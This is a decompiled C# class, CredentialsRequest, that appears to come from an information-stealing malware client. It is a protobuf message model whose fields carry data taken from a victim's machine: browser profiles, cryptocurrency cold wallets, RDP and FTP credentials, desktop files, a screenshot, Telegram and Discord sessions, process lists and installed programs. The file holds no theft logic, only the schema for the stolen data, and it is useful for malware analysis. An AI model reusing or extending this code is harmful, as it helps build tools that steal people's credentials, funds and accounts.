using System;
using System.Collections.Generic;
using System.ComponentModel;
using NoiseMe.Drags.App.Models.Common;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Requests
{
	// Token: 0x0200012F RID: 303
	[ProtoContract(Name = "CredentialsRequest")]
	public class CredentialsRequest : INotifyPropertyChanged
	{
		// Token: 0x1700025D RID: 605
		// (get) Token: 0x0600095A RID: 2394 RVA: 0x00007282 File Offset: 0x00005482
		// (set) Token: 0x0600095B RID: 2395 RVA: 0x0000728A File Offset: 0x0000548A
		[ProtoMember(1, Name = "ClientInformation")]
		public RemoteClientInformation ClientInformation
		{
			get
			{
				return this._clientInformation;
			}
			set
			{
				this._clientInformation = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("ClientInformation"));
			}
		}

		// Token: 0x1700025E RID: 606
		// (get) Token: 0x0600095C RID: 2396 RVA: 0x0001F674 File Offset: 0x0001D874
		// (set) Token: 0x0600095D RID: 2397 RVA: 0x000072AE File Offset: 0x000054AE
		[ProtoMember(2, Name = "BrowserProfiles")]
		public List<BrowserProfile> BrowserProfiles
		{
			get
			{
				List<BrowserProfile> result;
				if ((result = this._browserProfiles) == null)
				{
					result = (this._browserProfiles = new List<BrowserProfile>());
				}
				return result;
			}
			set
			{
				this._browserProfiles = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("BrowserProfiles"));
			}
		}

		// Token: 0x1700025F RID: 607
		// (get) Token: 0x0600095E RID: 2398 RVA: 0x0001F69C File Offset: 0x0001D89C
		// (set) Token: 0x0600095F RID: 2399 RVA: 0x000072D2 File Offset: 0x000054D2
		[ProtoMember(3, Name = "ColdWallets")]
		public List<ColdWallet> ColdWallets
		{
			get
			{
				List<ColdWallet> result;
				if ((result = this._coldWallets) == null)
				{
					result = (this._coldWallets = new List<ColdWallet>());
				}
				return result;
			}
			set
			{
				this._coldWallets = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("BrowserProfiles"));
			}
		}

		// Token: 0x17000260 RID: 608
		// (get) Token: 0x06000960 RID: 2400 RVA: 0x0001F6C4 File Offset: 0x0001D8C4
		// (set) Token: 0x06000961 RID: 2401 RVA: 0x000072F6 File Offset: 0x000054F6
		[ProtoMember(4, Name = "RdpConnections")]
		public List<RdpCredential> RdpConnections
		{
			get
			{
				List<RdpCredential> result;
				if ((result = this._rdpConnections) == null)
				{
					result = (this._rdpConnections = new List<RdpCredential>());
				}
				return result;
			}
			set
			{
				this._rdpConnections = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("RdpConnections"));
			}
		}

		// Token: 0x17000261 RID: 609
		// (get) Token: 0x06000962 RID: 2402 RVA: 0x0001F6EC File Offset: 0x0001D8EC
		// (set) Token: 0x06000963 RID: 2403 RVA: 0x0000731A File Offset: 0x0000551A
		[ProtoMember(5, Name = "DesktopFiles")]
		public List<DesktopFile> DesktopFiles
		{
			get
			{
				List<DesktopFile> result;
				if ((result = this._desktopFiles) == null)
				{
					result = (this._desktopFiles = new List<DesktopFile>());
				}
				return result;
			}
			set
			{
				this._desktopFiles = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("DesktopFiles"));
			}
		}

		// Token: 0x17000262 RID: 610
		// (get) Token: 0x06000964 RID: 2404 RVA: 0x0001F714 File Offset: 0x0001D914
		// (set) Token: 0x06000965 RID: 2405 RVA: 0x0000733E File Offset: 0x0000553E
		[ProtoMember(6, Name = "FtpCredentials")]
		public List<FtpCredential> FtpCredentials
		{
			get
			{
				List<FtpCredential> result;
				if ((result = this._ftpCredentials) == null)
				{
					result = (this._ftpCredentials = new List<FtpCredential>());
				}
				return result;
			}
			set
			{
				this._ftpCredentials = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("FtpCredentials"));
			}
		}

		// Token: 0x17000263 RID: 611
		// (get) Token: 0x06000966 RID: 2406 RVA: 0x00007362 File Offset: 0x00005562
		// (set) Token: 0x06000967 RID: 2407 RVA: 0x0000736A File Offset: 0x0000556A
		[ProtoMember(7, Name = "Screenshot")]
		public byte[] Screenshot
		{
			get
			{
				return this._screenshot;
			}
			set
			{
				this._screenshot = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Screenshot"));
			}
		}

		// Token: 0x17000264 RID: 612
		// (get) Token: 0x06000968 RID: 2408 RVA: 0x0000738E File Offset: 0x0000558E
		// (set) Token: 0x06000969 RID: 2409 RVA: 0x00007396 File Offset: 0x00005596
		[ProtoMember(8, Name = "TelegramSession")]
		public TelegramSession Telegram
		{
			get
			{
				return this._telegram;
			}
			set
			{
				this._telegram = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Telegram"));
			}
		}

		// Token: 0x17000265 RID: 613
		// (get) Token: 0x0600096A RID: 2410 RVA: 0x000073BA File Offset: 0x000055BA
		// (set) Token: 0x0600096B RID: 2411 RVA: 0x000073C2 File Offset: 0x000055C2
		[ProtoMember(9, Name = "DiscordSession")]
		public DiscordSession Discord
		{
			get
			{
				return this._discord;
			}
			set
			{
				this._discord = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Discord"));
			}
		}

		// Token: 0x17000266 RID: 614
		// (get) Token: 0x0600096C RID: 2412 RVA: 0x000073E6 File Offset: 0x000055E6
		// (set) Token: 0x0600096D RID: 2413 RVA: 0x000073EE File Offset: 0x000055EE
		[ProtoMember(10, Name = "RemoteProcess")]
		public List<RemoteProcess> ProcessList
		{
			get
			{
				return this._processList;
			}
			set
			{
				this._processList = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("ProcessList"));
			}
		}

		// Token: 0x17000267 RID: 615
		// (get) Token: 0x0600096E RID: 2414 RVA: 0x00007412 File Offset: 0x00005612
		// (set) Token: 0x0600096F RID: 2415 RVA: 0x0000741A File Offset: 0x0000561A
		[ProtoMember(11, Name = "InstalledPrograms")]
		public List<string> InstalledPrograms
		{
			get
			{
				return this._installedPrograms;
			}
			set
			{
				this._installedPrograms = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("InstalledPrograms"));
			}
		}

		// Token: 0x17000268 RID: 616
		// (get) Token: 0x06000970 RID: 2416 RVA: 0x0000743E File Offset: 0x0000563E
		// (set) Token: 0x06000971 RID: 2417 RVA: 0x00007446 File Offset: 0x00005646
		[ProtoMember(12, Name = "CompletedTasks")]
		public List<int> CompletedTasks
		{
			get
			{
				return this._tasksIds;
			}
			set
			{
				this._tasksIds = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("CompletedTasks"));
			}
		}

		// Token: 0x14000017 RID: 23
		// (add) Token: 0x06000972 RID: 2418 RVA: 0x0001F73C File Offset: 0x0001D93C
		// (remove) Token: 0x06000973 RID: 2419 RVA: 0x0001F774 File Offset: 0x0001D974
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x04000397 RID: 919
		private byte[] _screenshot;

		// Token: 0x04000398 RID: 920
		private List<FtpCredential> _ftpCredentials;

		// Token: 0x04000399 RID: 921
		private List<DesktopFile> _desktopFiles;

		// Token: 0x0400039A RID: 922
		private List<RdpCredential> _rdpConnections;

		// Token: 0x0400039B RID: 923
		private List<ColdWallet> _coldWallets;

		// Token: 0x0400039C RID: 924
		private List<BrowserProfile> _browserProfiles;

		// Token: 0x0400039D RID: 925
		private List<RemoteProcess> _processList;

		// Token: 0x0400039E RID: 926
		private List<string> _installedPrograms;

		// Token: 0x0400039F RID: 927
		private RemoteClientInformation _clientInformation;

		// Token: 0x040003A0 RID: 928
		private TelegramSession _telegram;

		// Token: 0x040003A1 RID: 929
		private DiscordSession _discord;

		// Token: 0x040003A2 RID: 930
		private List<int> _tasksIds;
	}
}
